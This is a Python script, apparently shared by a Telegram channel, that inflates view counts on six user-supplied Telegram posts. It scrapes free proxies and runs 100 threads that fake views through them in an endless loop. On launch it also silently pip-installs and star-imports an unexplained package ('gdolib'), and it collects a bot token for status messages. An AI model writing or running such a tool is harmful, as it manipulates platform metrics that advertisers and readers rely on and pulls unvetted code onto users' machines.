# ------- Import Library's
import os,sys
try:
	import requests
except:
	os.system('pip3 install requests')
import requests
import threading
from threading import active_count
import urllib
import time
import os , random , time , string
os.system('pip install gdolib==0.2.6')
def cls():
	os.system('clear')
cls()
try:
	import requests , datetime , webbrowser
	from gdolib import *
except ModuleNotFoundError:
	os.system('pip install webbrowser')
	os.system('pip install requests')
	os.system('pip install datetime')
	os.system("clear")
#-----------[ Colors ]-----------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
E = "\033[0;90m" #رمادي
#------------------------------[Start X5]------------------------------
def azz():
	gdo0 =(f"""{X}                                                        
BY: BEBO """)
	azro = (f"""
    {C}مرحبا بك عزيزي
{Z}┏━━━━━━━━━━━━━━━┓           
{X}┃{C} ⌯ Channel {Z}›{C} B Y : @LL_php {X}┃
{Z}┗━━━━━━━━━━━━━━━┛          """)
	for azoz in gdo0.splitlines():
		time.sleep(0.05)
		print(azoz)
	for azr in azro.splitlines():
		time.sleep(0.05)
		print(azr)
azz()
token = input(f'{X} [{C}⌯{X}] {C}قوم بأرسال التوكن{X} » ' + C)
ID = input(f'{X} [{C}⌯{X}] {C}قوم بارسال ايدي حسابك {X}» ' + C)
print(f" {X}---------------------- ")

def hello():
	x = datetime.datetime.now()
	g = datetime.datetime(2028, 10, 18, 1, 00, 0)
	if(x) > (g) or (x) == (g):
		  print(Z+'\n\n تم ايقاف الاداة.')
		  s = ('• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n • الاده وقفت .\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •')
		  start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}")
		  webbrowser.open("https://t.me/LL_php")
		  exit()
	else:
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم التفعيل ✅")
hello()

n_threads = 100  
threads = []
print('\033[1;32m••••••••••••••\033[1;  \033[1;32m••••••••\033[1;33mTele: @LL_php')
print()
link1=input('\033[1;31mPost link1: ')
link2=input('\033[1;32mPost link2: ')
link3=input('\033[1;33mPost link3: ')
link4=input('\033[1;34mPost link4: ')
link5=input('\033[1;35mPost link5: ')
link6=input('\033[1;36mPost link6: ')
#################
def view2(proxy):
    links = [link1,link2,link3,link4,link5,link6]
    for i in links:
        channel = i.split('/')[3]
        msgid = i.split('/')[4]
        send_seen(channel, msgid, proxy)
###############
def send_seen(channel, msgid, proxy):
    s = requests.Session()
    proxies = {
        'http': proxy,
        'https': proxy,
    }
    try:

        a = s.get("https://t.me/"+channel+"/"+msgid,
                  timeout=10, proxies=proxies)
        cookie = a.headers['set-cookie'].split(';')[0]
    except Exception as e:
        return False
    h1 = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7", "Connection": "keep-alive", "Content-Length": "5", "Content-type": "application/x-www-form-urlencoded",
          "Cookie": cookie, "Host": "t.me", "Origin": "https://t.me", "Referer": "https://t.me/"+channel+"/"+msgid+"?embed=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "User-Agent": "Chrome"}
    d1 = {"_rl": "1"}
    try:
        r = s.post('https://t.me/'+channel+'/'+msgid+'?embed=1',
                   json=d1, headers=h1, proxies=proxies)
        key = r.text.split('data-view="')[1].split('"')[0]
        now_view = r.text.split('<span class="tgme_widget_message_views">')[1].split('</span>')[0]
        if now_view.find("K") != -1:
            now_view = now_view.replace("K","00").replace(".", "")
    except Exception as e:
        return False
    h2 = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7", "Connection": "keep-alive", "Cookie": cookie, "Host": "t.me",
          "Referer": "https://t.me/"+channel+"/"+msgid+"?embed=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "User-Agent": "Chrome", "X-Requested-With": "XMLHttpRequest"}
    try:
        i = s.get('https://t.me/v/?views='+key, timeout=10,
                  headers=h2, proxies=proxies)
        if(i.text == "true"):
            print('\033[1;32mDone Add View ✅:\033[1;33m'+now_view)           
    except Exception as e:
        return False
    try:
        h3 = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7",
              "Cache-Control": "max-age=0", "Connection": "keep-alive", "Cookie": cookie, "Host": "t.me", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1", "User-Agent": "Chrome"}
        s.get("https://t.me/"+channel+"/"+msgid, headers=h3,
              timeout=10, proxies=proxies)
    except Exception as e:
        return False

def scrap():
    try:
        https = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
        http = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
        socks = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
    except Exception as e:
        print(e)
        return False
    f = open("proxies.txt", "w")
    f.write(https+"\n"+http)
    f.close()
    f = open("socks.txt", "w")
    f.write(socks)
    f.close()
    
def checker(proxy):
    proxies = {
        'http': proxy,
        'https': proxy,
    }
    try:
#        requests.get("https://t.me/LL_php/142", timeout=12, proxies=proxies)
        view2(proxy)
    except Exception as e:
        return False

def start():
    s = scrap()
    if s == False:
        return
    list = open('proxies.txt', 'r')
    proxies = list.readlines()
    list.close()
    for i in proxies:
        p = i.split('\n')[0]
        if not p:
            continue
        while active_count() > n_threads:
            liiii=9
        thread = threading.Thread(target=checker, args=(p,))
        threads.append(thread)
        thread.start()

    list = open('socks.txt', 'r')
    proxies = list.readlines()
    list.close()
    for i in proxies:
        p = i.split('\n')[0]
        if not p:
            continue
        while active_count() > n_threads:
          lii7ii=99
        pr = "socks5://"+p
        thread = threading.Thread(target=checker, args=(pr,))
        threads.append(thread)
        thread.start()
    
    
    return True
    
            
def process(run_for_ever:bool = False):
    if run_for_ever:
        while True:
            start()
    else:
        start()

process(True)





